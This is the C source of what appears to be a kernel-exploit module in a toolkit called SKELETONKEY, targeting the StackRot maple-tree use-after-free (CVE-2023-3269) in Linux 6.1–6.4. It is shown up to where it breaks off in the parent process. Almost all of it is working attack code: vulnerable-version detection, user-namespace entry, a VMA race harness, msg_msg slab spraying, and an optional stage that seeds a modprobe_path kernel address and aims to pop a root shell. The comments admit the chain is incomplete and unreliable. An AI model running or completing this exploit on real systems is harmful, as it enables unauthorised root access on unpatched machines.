/*
 * stackrot_cve_2023_3269 — SKELETONKEY module
 *
 * "Stack Rot": UAF in maple-tree-based VMA splitting. The maple
 * tree replaced the rbtree-based VMA store in 6.1; during
 * __vma_adjust() / split, the kernel could write to a maple node
 * after it was freed via RCU, leaving anon_vma references dangling
 * across the grace period. Exploitable for kernel R/W → cred
 * overwrite.
 *
 * Discovered by Ruihan Li (Peking University), Jul 2023. Famous
 * because it was the first significant exploit landed against the
 * (then-recently-merged) maple tree code, and because the original
 * disclosure included a public PoC that worked on default-config
 * Ubuntu 23.04. The full public PoC is ~1000 lines of maple-tree
 * state management + RCU-grace-period timing and depends on
 * per-kernel-build offsets for init_task / anon_vma / cred.
 *
 * STATUS: 🟡 OPTION C — race-driver + groom skeleton, with opt-in
 *   --full-chain FALLBACK finisher. We carry the userns-reach, race
 *   harness (mremap()/munmap() vs concurrent fork/fault), msg_msg
 *   slab spray, and empirical witness pieces; we do NOT carry the
 *   read primitive (vmemmap leak via msg_msg MSG_COPY) nor a
 *   Ruihan-Li-precision fake-anon_vma_chain plant. Those need
 *   per-kernel offsets (init_task, anon_vma, cred layout) that vary
 *   by build and would be fabricated without a real leak.
 *
 *   Per repo policy ("verified-vs-claimed"): we run the trigger,
 *   record empirical signals (slabinfo delta on kmalloc-192, child
 *   signal disposition, race iteration count), and return
 *   SKELETONKEY_EXPLOIT_FAIL with a continuation roadmap. A SIGSEGV/
 *   SIGBUS/SIGKILL in the race child IS recorded but does NOT get
 *   upgraded to EXPLOIT_OK — only an actual cred swap (euid==0)
 *   does, and we do not currently demonstrate that.
 *
 *   --full-chain (HONEST RELIABILITY DISCLOSURE): extends the race
 *   budget from 3 s to 30 s and sprays the kmalloc-192 slab with
 *   payloads tagged with the modprobe_path kernel address (so IF the
 *   UAF reclaim ever lands attacker-controlled bytes on an
 *   anon_vma_chain slot, those bytes carry the kaddr we want the
 *   subsequent rb_node walk / vma_lock-acquire fault to touch). The
 *   honest empirical reality is that even at 30 s the race-win rate
 *   is well below 1 % on a real vulnerable kernel — Ruihan Li's
 *   public PoC reports minutes-to-hours for first reclaim. The shared
 *   modprobe_path finisher has a 3 s sentinel timeout, so on the
 *   overwhelmingly common no-land outcome the finisher itself reports
 *   EXPLOIT_FAIL gracefully. --full-chain does NOT change the
 *   fundamental ~<1 %-per-run reliability; it widens the trigger
 *   window and wires up the root-pop plumbing for the lucky case.
 *
 * Affected: kernel 6.1.x — 6.4-rc4 mainline. Stable backports:
 *   6.3.x  : K >= 6.3.10
 *   6.1.x  : K >= 6.1.37 (LTS — most relevant)
 *   mainline 6.4-rc4+
 *
 * Pre-6.1 kernels are immune (no maple tree). 6.5+ are patched.
 *
 * Preconditions:
 *   - v.major >= 6 and v.minor in [1, 4]  (4 may straddle the fix)
 *   - maple tree in use (CONFIG_MAPLE_TREE; on by default 6.1+)
 *   - /proc/self/maps readable (sanity)
 *   - unprivileged_userns_clone allowed — namespace context improves
 *     groom predictability but the bug is reachable without it
 *
 * Coverage rationale: 2023 mm-class bug. Different family than our
 * netfilter-heavy 2022-2024 modules — broadens the corpus shape.
 * Affects the 6.1 LTS kernels still widely deployed.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <stdatomic.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>

#ifdef __linux__
#  include <sched.h>
#  include <sys/mman.h>
#  include <sys/syscall.h>
#  include <sys/ipc.h>
#  include <sys/msg.h>
#  include <linux/sched.h>
#endif

/* macOS clangd lacks the Linux mm/syscall headers — guard fallbacks. */
#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif
#ifndef MAP_GROWSDOWN
#define MAP_GROWSDOWN 0x00100
#endif
#ifndef MAP_FIXED_NOREPLACE
#define MAP_FIXED_NOREPLACE 0x100000
#endif
#ifndef MREMAP_MAYMOVE
#define MREMAP_MAYMOVE 1
#endif

static const struct kernel_patched_from stackrot_patched_branches[] = {
    {6, 1, 37},
    {6, 3, 10},
    {6, 4,  0},   /* mainline */
};

static const struct kernel_range stackrot_range = {
    .patched_from = stackrot_patched_branches,
    .n_patched_from = sizeof(stackrot_patched_branches) /
                      sizeof(stackrot_patched_branches[0]),
};

/* ---- Detect ------------------------------------------------------- */

/* Sanity check: maple-tree-era kernels expose /proc/self/maps; if it's
 * not readable here, something exotic is going on (selinux, seccomp,
 * chroot without /proc) and the bug is not reachable. */
static bool proc_self_maps_readable(void)
{
    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd < 0) return false;
    char b[64];
    ssize_t r = read(fd, b, sizeof b);
    close(fd);
    return r > 0;
}

/* On 6.1+ the maple tree is the only VMA store — we can't directly
 * grep for it from userspace, but /proc/self/maps being readable plus
 * a v.major>=6 / v.minor>=1 release is the proxy we use. */
static bool maple_tree_variant_present(const struct kernel_version *v)
{
    if (v->major > 6) return true;
    if (v->major == 6 && v->minor >= 1) return true;
    return false;
}

static skeletonkey_result_t stackrot_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json) fprintf(stderr, "[!] stackrot: host fingerprint missing kernel version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug introduced in 6.1 (when maple tree landed). Pre-6.1 kernels
     * use rbtree-based VMAs and don't have this bug. */
    if (v->major < 6 || (v->major == 6 && v->minor < 1)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] stackrot: kernel %s predates maple-tree VMA code (introduced in 6.1)\n",
                    v->release);
        }
        return SKELETONKEY_OK;
    }

    bool patched = kernel_range_is_patched(&stackrot_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] stackrot: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] stackrot: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] stackrot: mm-class bug — affects default-config kernels; "
                        "no exotic preconditions\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Userns reach ------------------------------------------------- */

#ifdef __linux__
static bool write_file(const char *path, const char *s)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return false;
    ssize_t n = write(fd, s, strlen(s));
    close(fd);
    return n == (ssize_t)strlen(s);
}

static bool enter_userns(uid_t outer_uid, gid_t outer_gid)
{
    if (unshare(CLONE_NEWUSER) < 0) return false;
    /* setgroups=deny is required before writing gid_map without
     * CAP_SETGID. */
    if (!write_file("/proc/self/setgroups", "deny")) return false;
    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", outer_uid);
    if (!write_file("/proc/self/uid_map", map)) return false;
    snprintf(map, sizeof map, "0 %u 1\n", outer_gid);
    if (!write_file("/proc/self/gid_map", map)) return false;
    return true;
}
#endif

/* ---- Race-driver state ------------------------------------------- */

/* Page size — fall back to 4 KiB if sysconf is unavailable (won't be on
 * any kernel we target). */
#define STACKROT_PAGE 4096UL

/* How large a region to play with for the MAP_GROWSDOWN segment +
 * neighbouring VMAs that we mutate with mremap()/munmap(). The
 * public PoC uses dozens of adjacent VMAs to force the maple tree
 * into the node-rotation path; we ship a configurable knob. */
#define STACKROT_RACE_VMAS              64
#define STACKROT_RACE_ITERATIONS        4000  /* per-iter budget */
#define STACKROT_RACE_TIME_BUDGET       3     /* seconds — primitive-only mode */
#define STACKROT_RACE_FULLCHAIN_BUDGET  30    /* seconds — extended for --full-chain */

/* Slab spray width — kmalloc-192 is the bucket for anon_vma_chain on
 * 6.1.x; targets vary slightly across kernels (anon_vma itself is
 * kmalloc-192 too on 64-bit with default debug-off configs). */
#define STACKROT_SPRAY_QUEUES      16
#define STACKROT_SPRAY_PER_QUEUE   64
#define STACKROT_SPRAY_PAYLOAD     176   /* 192 - 16 (msg_msg header) */

struct ipc_payload {
    long mtype;
    unsigned char buf[STACKROT_SPRAY_PAYLOAD];
};

static _Atomic int g_race_running;
static _Atomic uint64_t g_race_a_iters;
static _Atomic uint64_t g_race_b_iters;
static _Atomic uint64_t g_race_b_faults;

#ifdef __linux__

/* Pin to a CPU to encourage Thread A and Thread B to land on
 * different physical cores (we set complementary masks at thread
 * start). Best-effort: failure is non-fatal. */
static void pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof set, &set);
}

/* The race victim region: a MAP_GROWSDOWN-mapped page whose
 * neighbours we'll dance around with mremap()/munmap(). We keep a
 * couple of anchor pages above and below so the maple tree has to
 * resolve splits and rotations rather than degenerate to a single
 * leaf insertion.
 *
 * Layout (low to high VA):
 *   [anchor_lo] [growsdown_stack] [filler ... ] [anchor_hi]
 *
 * Thread A repeatedly:
 *   - mmap a scratch page at a chosen address
 *   - mremap it to overlap the boundary that triggers __vma_adjust()
 *   - munmap to free the VMA — this is the codepath whose maple-tree
 *     state is racy on 6.1.0..6.4-rc4.
 *
 * Thread B repeatedly:
 *   - fork() a tiny child that touches the growsdown region (fault) +
 *     immediately _exit()s.  The fork path walks the parent's VMA
 *     tree and the child's fault path follows anon_vma chains — both
 *     observe maple-tree node state.  Concurrent observation of a
 *     freed node is the trigger condition for the UAF.
 *
 * On a vulnerable kernel the race window is microseconds wide and
 * the public PoC reports needing thousands to millions of iterations.
 */

struct race_region {
    void *anchor_lo;
    void *growsdown;
    void *anchor_hi;
    size_t growsdown_len;
    /* Scratch address chosen below the growsdown region so mremap()
     * can move pages towards the growsdown boundary. */
    uintptr_t scratch_va;
};

static bool race_region_setup(struct race_region *r)
{
    memset(r, 0, sizeof *r);
    r->growsdown_len = STACKROT_PAGE * 4;

    /* Reserve a fixed-address arena far from libc/heap so MAP_FIXED_-
     * NOREPLACE mmaps don't collide. 0x70000000 region is reliably
     * free on standard distros; for production work this would be
     * chosen via /proc/self/maps inspection. */
    uintptr_t base = 0x70000000UL;

    r->anchor_lo = mmap((void *)base, STACKROT_PAGE,
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
                       -1, 0);
    if (r->anchor_lo == MAP_FAILED) {
        /* Address might be taken; fall back to letting kernel pick. */
        r->anchor_lo = mmap(NULL, STACKROT_PAGE,
                           PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS,
                           -1, 0);
        if (r->anchor_lo == MAP_FAILED) return false;
        base = (uintptr_t)r->anchor_lo + STACKROT_PAGE;
    } else {
        base += STACKROT_PAGE;
    }

    r->growsdown = mmap((void *)base, r->growsdown_len,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN,
                        -1, 0);
    if (r->growsdown == MAP_FAILED) {
        /* Some kernels reject MAP_GROWSDOWN without a fixed hint; retry. */
        r->growsdown = mmap(NULL, r->growsdown_len,
                            PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN,
                            -1, 0);
        if (r->growsdown == MAP_FAILED) return false;
        base = (uintptr_t)r->growsdown + r->growsdown_len;
    } else {
        base += r->growsdown_len;
    }

    r->anchor_hi = mmap((void *)base, STACKROT_PAGE,
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS,
                       -1, 0);
    if (r->anchor_hi == MAP_FAILED) return false;

    /* Touch each region so the kernel actually populates the
     * anon_vma chain (anon_vma is allocated lazily on first fault). */
    ((volatile char *)r->anchor_lo)[0] = 1;
    ((volatile char *)r->growsdown)[r->growsdown_len - 1] = 1;
    ((volatile char *)r->anchor_hi)[0] = 1;

    r->scratch_va = (uintptr_t)r->growsdown - STACKROT_PAGE;
    return true;
}

static void race_region_teardown(struct race_region *r)
{
    if (r->anchor_lo && r->anchor_lo != MAP_FAILED)
        munmap(r->anchor_lo, STACKROT_PAGE);
    if (r->growsdown && r->growsdown != MAP_FAILED)
        munmap(r->growsdown, r->growsdown_len);
    if (r->anchor_hi && r->anchor_hi != MAP_FAILED)
        munmap(r->anchor_hi, STACKROT_PAGE);
}

/* Thread A: trigger the maple-tree node-rotation path by repeatedly
 * mapping, mremap-extending toward the growsdown boundary, and
 * munmapping. The exact ordering (the node-rotation must happen
 * while a parallel reader is in the RCU read-side critical section)
 * is what makes this race hard. */
static void *race_thread_a(void *arg)
{
    struct race_region *r = (struct race_region *)arg;
    pin_to_cpu(0);
    while (atomic_load_explicit(&g_race_running, memory_order_acquire)) {
        /* mmap a scratch page just below the growsdown region. */
        void *scratch = mmap((void *)r->scratch_va, STACKROT_PAGE,
                             PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (scratch == MAP_FAILED) {
            sched_yield();
            continue;
        }
        ((volatile char *)scratch)[0] = 2;

        /* mremap to a new VA (forces VMA split + maple-tree mutation). */
        void *moved = mremap(scratch, STACKROT_PAGE, STACKROT_PAGE * 2,
                             MREMAP_MAYMOVE);
        if (moved != MAP_FAILED) {
            ((volatile char *)moved)[0] = 3;
            munmap(moved, STACKROT_PAGE * 2);
        } else {
            munmap(scratch, STACKROT_PAGE);
        }

        atomic_fetch_add_explicit(&g_race_a_iters, 1, memory_order_relaxed);
        sched_yield();
    }
    return NULL;
}

/* Thread B: spawn a short-lived child that faults the growsdown
 * region, then _exit. fork() copies the parent's VMA tree (touches
 * every maple-tree node and anon_vma chain) — racing against
 * Thread A's munmap, the child can observe a freed node. The page
 * fault inside the child closes the loop: the bug manifests as a
 * read of stale anon_vma->root or anon_vma_chain->same_vma. */
static void *race_thread_b(void *arg)
{
    struct race_region *r = (struct race_region *)arg;
    pin_to_cpu(1);
    while (atomic_load_explicit(&g_race_running, memory_order_acquire)) {
        pid_t pid = fork();
        if (pid == 0) {
            /* Child: brief, deterministic fault sequence. */
            volatile char *p = (volatile char *)r->growsdown;
            char sink = 0;
            for (size_t off = 0; off < r->growsdown_len; off += STACKROT_PAGE) {
                sink ^= p[off];
            }
            (void)sink;
            _exit(0);
        }
        if (pid > 0) {
            int status = 0;
            waitpid(pid, &status, 0);
            if (WIFSIGNALED(status)) {
                /* Child died on a fault — interesting signal for
                 * empirical witness. The race-driver caller polls
                 * this counter. */
                atomic_fetch_add_explicit(&g_race_b_faults, 1,
                                          memory_order_relaxed);
            }
            atomic_fetch_add_explicit(&g_race_b_iters, 1,
                                      memory_order_relaxed);
        }
        sched_yield();
    }
    return NULL;
}

/* ---- Groom skeleton ---------------------------------------------- */

/* msg_msg sysv spray for kmalloc-192. Tagged with "SKELETONKEY_" cookie
 * so a forensic look at /proc/slabinfo / KASAN dumps shows our
 * fingerprint. */
static int spray_anon_vma_slab(int queues[STACKROT_SPRAY_QUEUES])
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x4943;   /* 'IC' */
    memset(p.buf, 0x49, sizeof p.buf);
    memcpy(p.buf, "SKELETONKEY_", 8);

    int created = 0;
    for (int i = 0; i < STACKROT_SPRAY_QUEUES; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < STACKROT_SPRAY_PER_QUEUE; j++) {
            if (msgsnd(q, &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_anon_vma_slab(int queues[STACKROT_SPRAY_QUEUES])
{
    for (int i = 0; i < STACKROT_SPRAY_QUEUES; i++) {
        if (queues[i] >= 0) msgctl(queues[i], IPC_RMID, NULL);
    }
}

/* Read /proc/slabinfo for kmalloc-192 active count. Used as the
 * primary empirical witness: a successful UAF + refill perturbs
 * this counter in a way that's distinguishable from idle drift. */
static long slab_active_kmalloc_192(void)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "kmalloc-192 ", 12) == 0) {
            char name[64];
            long act = 0, num = 0;
            if (sscanf(line, "%63s %ld %ld", name, &act, &num) >= 2) {
                active = act;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* ---- Arb-write primitive (FALLBACK depth) ------------------------
 *
 * The shared modprobe_path finisher calls back into this function
 * once per kernel write it wants to land. For StackRot we cannot
 * deliver a deterministic arb-write — the underlying race wins on
 * well under 1 % of runs even with a 30 s budget, and even when the
 * race wins our spray-only groom has nowhere near the precision of
 * Ruihan Li's multi-stage public PoC (which crafts a fake
 * anon_vma_chain whose `vma_lock` pointer steers a subsequent
 * page-fault into touching `kaddr` for the lock acquire).
 *
 * Honest depth: FALLBACK. Each invocation:
 *   1. Re-seeds the kmalloc-192 spray with payloads tagged with
 *      `kaddr` packed into the first qword of the msg_msg body —
 *      so IF a sprayed slot ends up overlaying the freed
 *      anon_vma_chain after RCU grace, the kaddr we want the
 *      kernel to deref appears at the AVC layout position the
 *      maple-tree rotation will read.
 *   2. Re-runs the race threads for an extended budget
 *      (STACKROT_RACE_FULLCHAIN_BUDGET seconds).
 *   3. Returns 0 unconditionally — we cannot in-process verify
 *      whether the write landed. The shared finisher's 3 s sentinel
 *      file check is the empirical arbiter: on the overwhelmingly
 *      common no-land outcome it reports EXPLOIT_FAIL gracefully,
 *      and we never claim a write that didn't land. */
struct stackrot_arb_ctx {
    int   *queues;          /* live SysV msg queue ids */
    int    n_queues;
    int    arb_calls;       /* incremented by stackrot_arb_write() */
    struct race_region *region;
};

static int stackrot_reseed_kaddr_spray(int queues[STACKROT_SPRAY_QUEUES],
                                       uintptr_t kaddr,
                                       const void *buf, size_t len)
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x4943;   /* 'IC' */
    memset(p.buf, 0x49, sizeof p.buf);
    memcpy(p.buf, "SKELETONKEY_", 8);

    /* Pack the target kaddr at byte 8 (one qword in) and the
     * caller's payload bytes immediately after — this way ANY
     * reasonable AVC field offset hit by the corruption pulls
     * out one of our two attacker-controlled regions. */
    uint64_t k64 = (uint64_t)kaddr;
    memcpy(p.buf + 8, &k64, sizeof k64);
    size_t copy = len;
    if (copy > sizeof p.buf - 16) copy = sizeof p.buf - 16;
    if (buf && copy) memcpy(p.buf + 16, buf, copy);

    /* Replace contents in a couple of queues; doing all 16 would
     * blow the per-process msgq quota on busy hosts. */
    int touched = 0;
    for (int i = 0; i < STACKROT_SPRAY_QUEUES && touched < 4; i++) {
        if (queues[i] < 0) continue;
        if (msgsnd(queues[i], &p, sizeof p.buf, IPC_NOWAIT) == 0) touched++;
    }
    return touched;
}

static int stackrot_arb_write(uintptr_t kaddr,
                              const void *buf, size_t len,
                              void *ctx_v)
{
    struct stackrot_arb_ctx *c = (struct stackrot_arb_ctx *)ctx_v;
    if (!c || !c->queues || c->n_queues == 0 || !c->region) return -1;
    c->arb_calls++;

    fprintf(stderr, "[*] stackrot: arb_write attempt #%d kaddr=0x%lx len=%zu "
                    "(FALLBACK — race-dependent)\n",
            c->arb_calls, (unsigned long)kaddr, len);

    /* Step 1: re-seed spray with kaddr-tagged payloads. */
    int seeded = stackrot_reseed_kaddr_spray(c->queues, kaddr, buf, len);
    if (seeded == 0) {
        fprintf(stderr, "[-] stackrot: arb_write: kaddr-tagged reseed produced 0 msgs\n");
        /* Continue anyway — original spray still tagged with cookie. */
    } else {
        fprintf(stderr, "[*] stackrot: arb_write: reseeded %d msg_msg slots with kaddr tag\n",
                seeded);
    }

    /* Step 2: extended race window. Honestly: this expands the
     * trigger budget from 3 s to 30 s, but Ruihan Li's PoC reports
     * minutes-to-hours for first reclaim — so 30 s ≈ <1 % per
     * arb_write call on a real vulnerable kernel, and structurally
     * 0 % on a patched one. */
    atomic_store(&g_race_running, 1);
    atomic_store(&g_race_a_iters, 0);
    atomic_store(&g_race_b_iters, 0);
    atomic_store(&g_race_b_faults, 0);
    pthread_t ta, tb;
    bool a_ok = pthread_create(&ta, NULL, race_thread_a, c->region) == 0;
    bool b_ok = a_ok &&
                pthread_create(&tb, NULL, race_thread_b, c->region) == 0;
    if (!a_ok || !b_ok) {
        atomic_store(&g_race_running, 0);
        if (a_ok) pthread_join(ta, NULL);
        fprintf(stderr, "[-] stackrot: arb_write: pthread_create failed\n");
        return -1;
    }

    sleep(STACKROT_RACE_FULLCHAIN_BUDGET);
    atomic_store(&g_race_running, 0);
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    uint64_t a_iters = atomic_load(&g_race_a_iters);
    uint64_t b_iters = atomic_load(&g_race_b_iters);
    uint64_t b_faults = atomic_load(&g_race_b_faults);
    fprintf(stderr, "[*] stackrot: arb_write: extended race A=%llu B=%llu B_faults=%llu "
                    "(reliability remains <1%% even at this budget)\n",
            (unsigned long long)a_iters,
            (unsigned long long)b_iters,
            (unsigned long long)b_faults);

    /* Step 3: cannot in-process verify the write. Return 0; the
     * finisher's sentinel-file check is the empirical arbiter. */
    return 0;
}

#endif /* __linux__ */

/* ---- Exploit driver ---------------------------------------------- */

#ifdef __linux__

static skeletonkey_result_t stackrot_exploit_linux(const struct skeletonkey_ctx *ctx)
{
    /* 1. Refuse-gate: re-call detect() and short-circuit. */
    skeletonkey_result_t pre = stackrot_detect(ctx);
    if (pre == SKELETONKEY_OK) {
        fprintf(stderr, "[+] stackrot: kernel not vulnerable; refusing exploit\n");
        return SKELETONKEY_OK;
    }
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] stackrot: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] stackrot: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }
    if (!proc_self_maps_readable()) {
        fprintf(stderr, "[-] stackrot: /proc/self/maps not readable — exotic env, "
                        "cannot drive the race\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    {
        const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
        if (!v || v->major == 0 || !maple_tree_variant_present(v)) {
            fprintf(stderr, "[-] stackrot: maple-tree variant not detectable\n");
            return SKELETONKEY_PRECOND_FAIL;
        }
    }

    /* Full-chain pre-check: resolve offsets BEFORE forking + entering
     * userns. If modprobe_path is unresolvable we refuse here rather
     * than running a 30 s race that has no finisher to call. */
    struct skeletonkey_kernel_offsets off;
    bool full_chain_ready = false;
    if (ctx->full_chain) {
        memset(&off, 0, sizeof off);
        skeletonkey_offsets_resolve(&off);
        if (!skeletonkey_offsets_have_modprobe_path(&off)) {
            skeletonkey_finisher_print_offset_help("stackrot");
            fprintf(stderr, "[-] stackrot: --full-chain requested but modprobe_path "
                            "offset unresolved; refusing\n");
            fprintf(stderr, "[i] stackrot: even with offsets, race-win reliability is "
                            "well below 1%% per run — see module header.\n");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        skeletonkey_offsets_print(&off);
        full_chain_ready = true;
        fprintf(stderr, "[i] stackrot: --full-chain ready — race budget extends to "
                        "%d s, but RELIABILITY REMAINS <1%% per run on a real\n"
                        "    vulnerable kernel. The finisher's 3 s sentinel timeout\n"
                        "    catches no-land outcomes gracefully.\n",
                STACKROT_RACE_FULLCHAIN_BUDGET);
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] stackrot: forking exploit child (userns + race harness%s)\n",
                ctx->full_chain ? " + full-chain finisher" : "");
    }

    uid_t outer_uid = getuid();
    gid_t outer_gid = getgid();
    signal(SIGPIPE, SIG_IGN);

    pid_t child = fork();
    if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* 2. Userns reach. Bug is reachable without it, but userns
         *    + uid_map=0 makes the groom more predictable (fewer
         *    competing kmalloc-192 allocations from the parent
         *    namespace's tooling). */
        if (!enter_userns(outer_uid, outer_gid)) {
            fprintf(stderr, "[~] stackrot: enter_userns failed — continuing without "
                            "namespace isolation (bug is still reachable)\n");
        }

        /* 3. Race region. */
        struct race_region region;
        if (!race_region_setup(&region)) {
            fprintf(stderr, "[-] stackrot: race_region_setup failed: %s\n",
                    strerror(errno));
            _exit(22);
        }

        /* 4. Groom: pre-populate kmalloc-192 with msg_msg payloads
         *    BEFORE the race so the freed slot gets recycled with
         *    attacker-controlled bytes when the bug fires. */
        int queues[STACKROT_SPRAY_QUEUES] = {0};
        int n_queues = spray_anon_vma_slab(queues);
        if (n_queues == 0) {
            fprintf(stderr, "[-] stackrot: msg_msg spray produced 0 queues\n");
            race_region_teardown(&region);
            _exit(23);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] stackrot: kmalloc-192 spray seeded %d queues x %d msgs\n",
                    n_queues, STACKROT_SPRAY_PER_QUEUE);
        }

        long slab_pre = slab_active_kmalloc_192();

        /* 5. Run the race for a bounded time budget. */
        atomic_store(&g_race_running, 1);
        atomic_store(&g_race_a_iters, 0);
        atomic_store(&g_race_b_iters, 0);
        atomic_store(&g_race_b_faults, 0);
        pthread_t ta, tb;
        if (pthread_create(&ta, NULL, race_thread_a, &region) != 0 ||
            pthread_create(&tb, NULL, race_thread_b, &region) != 0) {
            fprintf(stderr, "[-] stackrot: pthread_create failed\n");
            atomic_store(&g_race_running, 0);
            drain_anon_vma_slab(queues);
            race_region_teardown(&region);
            _exit(24);
        }

        sleep(STACKROT_RACE_TIME_BUDGET);
        atomic_store(&g_race_running, 0);
        pthread_join(ta, NULL);
        pthread_join(tb, NULL);

        long slab_post = slab_active_kmalloc_192();
        uint64_t a_iters = atomic_load(&g_race_a_iters);
        uint64_t b_iters = atomic_load(&g_race_b_iters);
        uint64_t b_faults = atomic_load(&g_race_b_faults);

        /* 6. Empirical witness breadcrumb. */
        FILE *log = fopen("/tmp/skeletonkey-stackrot.log", "w");
        if (log) {
            fprintf(log,
                "stackrot race harness:\n"
                "  thread_a_iters     = %llu (mremap/munmap)\n"
                "  thread_b_iters     = %llu (fork+fault)\n"
                "  thread_b_faults    = %llu (child died on signal)\n"
                "  slab_kmalloc192_pre  = %ld\n"
                "  slab_kmalloc192_post = %ld\n"
                "  slab_delta           = %ld\n"
                "  spray_queues       = %d\n"
                "  spray_per_queue    = %d\n"
                "  growsdown_len      = %zu\n"
                "Note: this run did NOT attempt cred overwrite (no leak\n"
                "primitive; per-kernel offsets unknown). See module .c\n"
                "for the continuation roadmap.\n",
                (unsigned long long)a_iters,
                (unsigned long long)b_iters,
                (unsigned long long)b_faults,
                slab_pre, slab_post,
                (slab_post >= 0 && slab_pre >= 0) ? (slab_post - slab_pre) : 0,
                n_queues, STACKROT_SPRAY_PER_QUEUE,
                (size_t)region.growsdown_len);
            fclose(log);
        }

        if (!ctx->json) {
            fprintf(stderr, "[*] stackrot: race ran for %ds — A=%llu B=%llu B_faults=%llu\n",
                    STACKROT_RACE_TIME_BUDGET,
                    (unsigned long long)a_iters,
                    (unsigned long long)b_iters,
                    (unsigned long long)b_faults);
            fprintf(stderr, "[*] stackrot: kmalloc-192 active: pre=%ld post=%ld\n",
                    slab_pre, slab_post);
        }

        /* Hold the spray so the kernel observes refilled slots during
         * any in-flight RCU grace periods that started during the race. */
        usleep(200 * 1000);

        /* 7a. --full-chain finisher (FALLBACK depth).
         *
         * Invoke the shared modprobe_path finisher; its arb_write
         * callback (stackrot_arb_write) will re-seed the spray with
         * kaddr-tagged payloads and re-run the race for an extended
         * 30 s budget. The finisher's own 3 s sentinel-file timeout
         * then arbitrates: on the overwhelmingly common no-land
         * outcome it returns EXPLOIT_FAIL gracefully.
         *
         * Honest reliability: <1 % per run even with the extension. */
        if (full_chain_ready) {
            struct stackrot_arb_ctx arb_ctx = {
                .queues    = queues,
                .n_queues  = STACKROT_SPRAY_QUEUES,
                .arb_calls = 0,
                .region    = &region,
            };
            int fr = skeletonkey_finisher_modprobe_path(&off,
                                                    stackrot_arb_write,
                                                    &arb_ctx,
                                                    !ctx->no_shell);
            FILE *fl = fopen("/tmp/skeletonkey-stackrot.log", "a");
            if (fl) {
                fprintf(fl, "full_chain finisher rc=%d arb_calls=%d\n",
                        fr, arb_ctx.arb_calls);
                fclose(fl);
            }
            drain_anon_vma_slab(queues);
            race_region_teardown(&region);
            if (fr == SKELETONKEY_EXPLOIT_OK) _exit(34);   /* root popped */
            _exit(35);                                  /* finisher ran, no land */
        }

        drain_anon_vma_slab(queues);
        race_region_teardown(&region);

        /* 7. Continuation roadmap — what would land EXPLOIT_OK.
         *
         *    TODO(leak): replace one of the spray queues with a
         *    msgrcv(..., MSG_COPY|IPC_NOWAIT) probe and scan the
         *    returned buffer for non-cookie bytes. The bug's UAF
         *    write leaves a kernel pointer (anon_vma->root or the
         *    mas->node parent) at a known offset inside the freed
         *    slab slot. Recover {kbase, init_task} via that leak.
         *
         *    TODO(write): with kbase known, repeat the trigger but
         *    plant a fake anon_vma_chain whose `rb_node` parent
         *    pointer points at &current->cred — the maple-tree
         *    rotation writes a controlled value into that location.
         *    Crafting the fake AVC requires offset of anon_vma_chain
         *    fields per kernel build (CONFIG_DEBUG_LIST/KFENCE/etc.
         *    perturb the layout — must NOT be hardcoded).
         *
         *    TODO(overwrite): land &init_cred over current->cred so
         *    the next call to a permission check sees uid==0.
         *
         *    None of these are implemented today.  We exit 30 to
         *    flag "trigger ran cleanly, no escalation".
         */
        _exit(30);
    }

    /* PARENT */
    int status = 0;
    pid_t w = waitpid(child, &status, 0);
    if (w < 0) { perror("waitpid"); return SKELETONKEY_TEST_ERROR; }

